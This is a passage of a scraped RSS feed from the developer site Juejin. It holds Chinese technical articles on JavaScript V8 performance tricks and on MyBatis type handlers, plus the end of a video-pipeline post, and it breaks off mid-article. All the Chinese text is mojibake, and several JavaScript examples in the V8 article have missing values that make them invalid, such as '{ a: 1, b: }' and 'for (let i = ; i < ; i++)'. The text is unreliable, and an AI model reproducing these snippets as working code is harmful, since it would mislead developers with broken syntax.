<li><strong>--only å‚æ•°ä¸¢å°¾å¸§</strong>ï¼šéœ€åŒ…å«ç›¸é‚»åœºæ™¯</li>
<li><strong>R2V ä¸ Fast å†²çª</strong>ï¼šR2V åªæ”¯æŒæ ‡å‡†ç‰ˆ</li>
<li><strong>å¤§å›¾è¶…æ—¶</strong>ï¼šé¢„å‹ç¼©è‡³ 1080p</li>
</ol>
<h2 data-id="heading-7">æ€»ç»“</h2>
<ul>
<li>é…ç½®é©±åŠ¨ï¼šJSON Schema ç±»å‹å®‰å…¨</li>
<li>å¸§å…³è”ï¼šè‡ªåŠ¨æ¨æ–­ç›¸é‚»åœºæ™¯</li>
<li>é”™è¯¯æ¢å¤ï¼šæŒ‡æ•°é€€é¿ + å¹¶å‘æ§åˆ¶</li>
</ul>
<p><em>æœ¬æ–‡åŸºäº OmnixFi é¡¹ç›®å®æˆ˜ç»éªŒã€‚</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScriptæ€§èƒ½ä¼˜åŒ–ï¼š7ä¸ªè¢«ä½ä¼°çš„V8å¼•æ“æŠ€å·§è®©ä½ çš„ä»£ç æé€Ÿ50%]]></title>    <link>https://juejin.cn/post/7590071125397733416</link>    <guid>https://juejin.cn/post/7590071125397733416</guid>    <pubDate>2026-01-02T00:16:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125397733416" data-draft-id="7589935326782652450" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScriptæ€§èƒ½ä¼˜åŒ–ï¼š7ä¸ªè¢«ä½ä¼°çš„V8å¼•æ“æŠ€å·§è®©ä½ çš„ä»£ç æé€Ÿ50%"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-02T00:16:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScriptæ€§èƒ½ä¼˜åŒ–ï¼š7ä¸ªè¢«ä½ä¼°çš„V8å¼•æ“æŠ€å·§è®©ä½ çš„ä»£ç æé€Ÿ50%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T00:16:32.000Z" title="Fri Jan 02 2026 00:16:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>JavaScriptæ€§èƒ½ä¼˜åŒ–ï¼š7ä¸ªè¢«ä½ä¼°çš„V8å¼•æ“æŠ€å·§è®©ä½ çš„ä»£ç æé€Ÿ50%</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>åœ¨ç°ä»£Webå¼€å‘ä¸­ï¼ŒJavaScriptçš„æ€§èƒ½ç›´æ¥å†³å®šäº†ç”¨æˆ·ä½“éªŒçš„è´¨é‡ã€‚ä½œä¸ºChromeå’ŒNode.jsçš„æ ¸å¿ƒå¼•æ“ï¼ŒV8ä»¥å…¶å“è¶Šçš„æ€§èƒ½ä¼˜åŒ–èƒ½åŠ›è€Œé—»åã€‚ç„¶è€Œï¼Œè®¸å¤šå¼€å‘è€…å¯¹V8çš„å†…éƒ¨å·¥ä½œåŸç†çŸ¥ä¹‹ç”šå°‘ï¼Œå¯¼è‡´ç¼–å†™çš„ä»£ç æœªèƒ½å……åˆ†åˆ©ç”¨å…¶æ½œåŠ›ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨7ä¸ªè¢«ä½ä¼°çš„V8å¼•æ“æŠ€å·§ï¼Œå¸®åŠ©ä½ æ˜¾è‘—æå‡ä»£ç æ‰§è¡Œæ•ˆç‡â€”â€”åœ¨æŸäº›åœºæ™¯ä¸‹ç”šè‡³å¯ä»¥å®ç°50%çš„æ€§èƒ½æå‡ã€‚</p>
<p>æˆ‘ä»¬å°†ä»V8çš„åº•å±‚æœºåˆ¶ï¼ˆå¦‚éšè—ç±»ã€å†…è”ç¼“å­˜ã€TurboFanç¼–è¯‘å™¨ï¼‰å‡ºå‘ï¼Œç»“åˆå…·ä½“ä»£ç ç¤ºä¾‹å’ŒåŸºå‡†æµ‹è¯•æ•°æ®ï¼Œæ­ç¤ºé‚£äº›é²œä¸ºäººçŸ¥ä½†æå…¶æœ‰æ•ˆçš„ä¼˜åŒ–ç­–ç•¥ã€‚æ— è®ºä½ æ˜¯å‰ç«¯å·¥ç¨‹å¸ˆè¿˜æ˜¯Node.jså¼€å‘è€…ï¼Œè¿™äº›æŠ€å·§éƒ½å°†ä¸ºä½ çš„æ€§èƒ½ä¼˜åŒ–å·¥å…·ç®±å¢æ·»åˆ©å™¨ã€‚</p>
<hr/>
<h2 data-id="heading-2">1. ç†è§£å¹¶åˆ©ç”¨éšè—ç±»ï¼ˆHidden Classesï¼‰</h2>
<h3 data-id="heading-3">ä¸ºä»€ä¹ˆéšè—ç±»é‡è¦ï¼Ÿ</h3>
<p>V8ä½¿ç”¨éšè—ç±»æ¥ä¼˜åŒ–å¯¹è±¡å±æ€§çš„è®¿é—®é€Ÿåº¦ã€‚å½“å¯¹è±¡çš„å½¢çŠ¶ï¼ˆå³å±æ€§çš„æ•°é‡å’Œé¡ºåºï¼‰å‘ç”Ÿå˜åŒ–æ—¶ï¼ŒV8ä¼šåˆ›å»ºæ–°çš„éšè—ç±»ï¼Œè¿™ä¼šå¯¼è‡´æ€§èƒ½å¼€é”€ã€‚</p>
<h3 data-id="heading-4">ä¼˜åŒ–æŠ€å·§ï¼š</h3>
<ul>
<li><strong>å§‹ç»ˆä»¥ç›¸åŒé¡ºåºåˆå§‹åŒ–å¯¹è±¡å±æ€§</strong>ï¼šé¿å…åŠ¨æ€æ·»åŠ å±æ€§æˆ–æ”¹å˜é¡ºåºã€‚</li>
<li><strong>å°½é‡åœ¨æ„é€ å‡½æ•°ä¸­ä¸€æ¬¡æ€§å®šä¹‰æ‰€æœ‰å±æ€§</strong>ï¼šå‡å°‘éšè—ç±»çš„è¿ç§»æ¬¡æ•°ã€‚</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åä¾‹ - ä½æ•ˆ</span>
<span class="hljs-keyword">const</span> obj = {};
obj.<span class="hljs-property">a</span> = <span class="hljs-number">1</span>;
obj.<span class="hljs-property">b</span> = <span class="hljs-number">2</span>;

<span class="hljs-comment">// æ­£ä¾‹ - é«˜æ•ˆ</span>
<span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> };
</code></pre>
<h3 data-id="heading-5">åŸºå‡†æµ‹è¯•ç»“æœï¼š</h3>
<p>åœ¨å¯†é›†å¯¹è±¡åˆ›å»ºçš„åœºæ™¯ä¸­ï¼Œéµå¾ªéšè—ç±»è§„åˆ™çš„ä»£ç å¯ä»¥å¿«20%-30%ã€‚</p>
<hr/>
<h2 data-id="heading-6">2. é¿å…å­—å…¸æ¨¡å¼ï¼ˆDictionary Modeï¼‰</h2>
<h3 data-id="heading-7">ä»€ä¹ˆæ˜¯å­—å…¸æ¨¡å¼ï¼Ÿ</h3>
<p>å½“å¯¹è±¡é¢‘ç¹æ·»åŠ æˆ–åˆ é™¤å±æ€§æ—¶ï¼ŒV8ä¼šå°†å…¶è½¬æ¢ä¸ºâ€œå­—å…¸æ¨¡å¼â€ï¼Œæ­¤æ—¶å±æ€§è®¿é—®é€Ÿåº¦æ˜¾è‘—ä¸‹é™ï¼ˆç±»ä¼¼å“ˆå¸Œè¡¨æŸ¥æ‰¾ï¼‰ã€‚</p>
<h3 data-id="heading-8">ä¼˜åŒ–æŠ€å·§ï¼š</h3>
<ul>
<li><strong>é¿å…ä½¿ç”¨<code>delete</code>æ“ä½œç¬¦</strong>ï¼šç”¨<code>null</code>æˆ–<code>undefined</code>æ›¿ä»£åˆ é™¤å±æ€§ã€‚</li>
<li><strong>å†»ç»“ä¸éœ€è¦ä¿®æ”¹çš„å¯¹è±¡</strong>ï¼šä½¿ç”¨<code>Object.freeze()</code>é˜²æ­¢æ„å¤–ä¿®æ”¹ã€‚</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åä¾‹ - è§¦å‘å­—å…¸æ¨¡å¼</span>
<span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: };
<span class="hljs-keyword">delete</span> obj.<span class="hljs-property">a</span>;

<span class="hljs-comment">// æ­£ä¾‹ - ä¿æŒå¿«é€Ÿè·¯å¾„</span>
<span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">a</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">b</span>: };
</code></pre>
<hr/>
<h2 data-id="heading-9">3. TurboFanå‹å¥½çš„æ•°å€¼ç±»å‹é€‰æ‹©</h2>
<h3 data-id="heading-10">V8å¦‚ä½•ä¼˜åŒ–æ•°å€¼è¿ç®—ï¼Ÿ</h3>
<p>TurboFanç¼–è¯‘å™¨å¯¹32ä½æ•´æ•°ï¼ˆSMIsï¼‰å’ŒåŒç²¾åº¦æµ®ç‚¹æ•°çš„å¤„ç†æ•ˆç‡æœ€é«˜ï¼Œè€Œå¯¹å…¶ä»–ç±»å‹ï¼ˆå¦‚å¤§æ•´æ•°æˆ–ç›’è£…å¯¹è±¡ï¼‰çš„è¿ç®—è¾ƒæ…¢ã€‚</p>
<h3 data-id="heading-11">ä¼˜åŒ–æŠ€å·§ï¼š</h3>
<ul>
<li><strong>ä¼˜å…ˆä½¿ç”¨SMIsï¼ˆ-2Â³Â¹åˆ°2Â³Â¹-1ï¼‰</strong>ï¼šé¿å…ä¸å¿…è¦çš„æµ®ç‚¹æ•°è½¬æ¢ã€‚</li>
<li><strong>é¿å…åœ¨çƒ­è·¯å¾„ä¸­ä½¿ç”¨<code>BigInt</code></strong>ï¼šé™¤éç»å¯¹å¿…è¦ã€‚</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// SMIsæ¯”æ™®é€šNumberæ›´å¿«</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = ; i &lt; ; i++) {} <span class="hljs-comment">// SMIèŒƒå›´</span>
</code></pre>
<hr/>
<h2 data-id="heading-12">4. Inline Cachingï¼ˆICï¼‰ä¸å‡½æ•°å•æ€æ€§</h2>
<h3 data-id="heading-13">Inline Cachingå¦‚ä½•å·¥ä½œï¼Ÿ</h3>
<p>V8é€šè¿‡ç¼“å­˜å‡½æ•°è°ƒç”¨çš„ç±»å‹ä¿¡æ¯æ¥åŠ é€Ÿåç»­è°ƒç”¨ã€‚å¦‚æœå‡½æ•°å‚æ•°ç±»å‹é¢‘ç¹å˜åŒ–ï¼ˆå¤šæ€ï¼‰ï¼Œç¼“å­˜å¤±æ•ˆä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚</p>
<h3 data-id="heading-14">ä¼˜åŒ–æŠ€å·§ï¼š</h3>
<ul>
<li><strong>ä¿æŒå‡½æ•°å‚æ•°ç±»å‹ä¸€è‡´</strong>ï¼šä¾‹å¦‚å§‹ç»ˆä¼ é€’æ•°å­—è€Œéæ··åˆç±»å‹ã€‚</li>
<li><strong>é¿å…å¤šæ€æ•°ç»„</strong>ï¼šæ•°ç»„ä¸­åº”å­˜å‚¨å•ä¸€ç±»å‹å…ƒç´ ã€‚</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// monomorphic &gt; polymorphic &gt; megamorphic</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, </span>) {
    <span class="hljs-keyword">return</span> a + ;
}
<span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>, ); <span class="hljs-comment">// Keep arguments consistent!</span>
</code></pre>
<hr/>
<h2 data-id="heading-15"/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatisç±»å‹å¤„ç†æ¨¡å—è¯¦è§£]]></title>    <link>https://juejin.cn/post/7589908657682628658</link>    <guid>https://juejin.cn/post/7589908657682628658</guid>    <pubDate>2026-01-02T00:33:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589908657682628658" data-draft-id="7589903499599429686" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatisç±»å‹å¤„ç†æ¨¡å—è¯¦è§£"/> <meta itemprop="keywords" content="MyBatis,Java"/> <meta itemprop="datePublished" content="2026-01-02T00:33:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨ä¸­é£˜è¡çš„è®°å¿†"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatisç±»å‹å¤„ç†æ¨¡å—è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨ä¸­é£˜è¡çš„è®°å¿†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T00:33:08.000Z" title="Fri Jan 02 2026 00:33:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ·±å…¥ç†è§£MyBatisç±»å‹è½¬æ¢æœºåˆ¶ï¼ŒæŒæ¡Javaä¸JDBCä¹‹é—´çš„æ¡¥æ¢</h2>
<h2 data-id="heading-1">ä¸€ã€MyBatisæ•´ä½“æ¶æ„ä¸ç±»å‹å¤„ç†æ¨¡å—</h2>
<p>åœ¨æ·±å…¥ç±»å‹å¤„ç†æ¨¡å—ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£MyBatisçš„æ•´ä½“æ¶æ„ï¼Œä»¥åŠç±»å‹å¤„ç†æ¨¡å—åœ¨å…¶ä¸­çš„é‡è¦åœ°ä½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa3fb0c4d5a7446ca23a602eccd2c6f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767918788&amp;x-signature=wtUr2ytFVsbv4eNXpEOp1UhkPnA%3D" alt="" loading="lazy"/></p>
<p>ä»æ¶æ„å›¾å¯ä»¥çœ‹å‡ºï¼ŒMyBatisé‡‡ç”¨äº†åˆ†å±‚æ¶æ„è®¾è®¡ï¼Œè€Œç±»å‹å¤„ç†æ¨¡å—ï¼ˆTypeHandlerï¼‰ä½äºåŸºç¡€æ”¯æ’‘å±‚ï¼Œæ˜¯è¿æ¥Javaç±»å‹ä¸JDBCç±»å‹çš„æ¡¥æ¢ã€‚å®ƒè´Ÿè´£åœ¨SQLæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå°†Javaå¯¹è±¡å‚æ•°è½¬æ¢ä¸ºJDBCèƒ½å¤Ÿè¯†åˆ«çš„å‚æ•°ç±»å‹ï¼Œä»¥åŠå°†ResultSetä¸­çš„æ•°æ®è½¬æ¢ä¸ºJavaå¯¹è±¡ã€‚</p>
<h2 data-id="heading-2">å‹å¤„ç†æ¨¡å—çš„æ ¸å¿ƒèŒè´£</h2>
<p>ç±»å‹å¤„ç†æ¨¡å—ä¸»è¦æ‰¿æ‹…ä»¥ä¸‹æ ¸å¿ƒèŒè´£ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">âœ… Javaç±»å‹ä¸JDBCç±»å‹ç›¸äº’è½¬æ¢ <span class="hljs-operator">-</span> å®ç°åŒå‘ç±»å‹è½¬æ¢
âœ… å‚æ•°è®¾ç½®æ—¶çš„ç±»å‹è½¬æ¢ <span class="hljs-operator">-</span> å°†Javaå‚æ•°è½¬æ¢ä¸ºJDBCå‚æ•°
âœ… ç»“æœé›†è·å–æ—¶çš„ç±»å‹è½¬æ¢ <span class="hljs-operator">-</span> å°†JDBCç»“æœè½¬æ¢ä¸ºJavaå¯¹è±¡
âœ… <span class="hljs-keyword">Null</span>å€¼å¤„ç† <span class="hljs-operator">-</span> å¤„ç†Javaç©ºå€¼ä¸JDBC <span class="hljs-keyword">NULL</span>çš„è½¬æ¢
âœ… ç±»å‹æ³¨å†Œä¸ç®¡ç† <span class="hljs-operator">-</span> ç»´æŠ¤Javaç±»å‹ä¸TypeHandlerçš„æ˜ å°„å…³ç³»
</code></pre>
<h2 data-id="heading-3">ä¸ºä»€ä¹ˆéœ€è¦TypeHandlerï¼Ÿ</h2>
<p>åœ¨Javaåº”ç”¨ç¨‹åºå’Œæ•°æ®åº“ä¹‹é—´ï¼Œå­˜åœ¨ç€ç±»å‹ç³»ç»Ÿçš„å·®å¼‚ï¼š</p>



































